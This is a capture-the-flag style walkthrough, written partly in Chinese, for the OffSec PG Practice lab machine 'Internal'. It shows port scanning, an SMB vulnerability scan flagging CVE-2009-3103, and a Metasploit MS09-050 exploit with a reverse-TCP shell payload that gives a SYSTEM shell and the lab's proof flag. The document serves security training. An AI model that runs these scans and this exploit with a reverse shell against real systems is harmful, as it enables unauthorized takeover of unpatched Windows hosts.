###### tags: `Offsec` `PG Practice` `Easy` `Windows`

# Internal
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.204.40 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.204.40:135
Open 192.168.204.40:139
Open 192.168.204.40:445
Open 192.168.204.40:5357
Open 192.168.204.40:3389
Open 192.168.204.40:49152
Open 192.168.204.40:49153
Open 192.168.204.40:49154
Open 192.168.204.40:49155
Open 192.168.204.40:49156
Open 192.168.204.40:49157
Open 192.168.204.40:49158

PORT      STATE SERVICE            REASON  VERSION
135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack
5357/tcp  open  http               syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack Microsoft Windows RPC
49156/tcp open  msrpc              syn-ack Microsoft Windows RPC
49157/tcp open  msrpc              syn-ack Microsoft Windows RPC
49158/tcp open  msrpc              syn-ack Microsoft Windows RPC
```

偷用網路上拿到的指令
```
┌──(kali㉿kali)-[~/pgplay]
└─$ nmap -T4 -p445 --script smb-vuln* 192.168.204.40     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-19 21:42 EDT
Nmap scan report for 192.168.204.40
Host is up (0.22s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
```

又是bufferflow，再偷懶用`msfconsole`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ msfconsole

msf6 > search MS09-050

Matching Modules
================

   #  Name                                                       Disclosure Date  Rank    Check  Description
   -  ----                                                       ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms09_050_smb2_negotiate_func_index     2009-09-07       good    No     MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   1  auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                   normal  No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   2  auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                      normal  No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
   
msf6 > use 0
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set payload windows/shell_reverse_tcp
payload => windows/shell_reverse_tcp
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set RHOSTS 192.168.204.40
RHOSTS => 192.168.204.40
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set LHOST 192.168.45.242
LHOST => 192.168.45.242
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > run
```

一進去就是Administrator權限了，在`C:\Users\Administrator\Desktop`得到proof.txt
```
C:\Windows\system32>whoami 
whoami
nt authority\system

C:\Users\Administrator\Desktop>type proof.txt
d615a7ad9fd7113003d162a4953b2ff0
```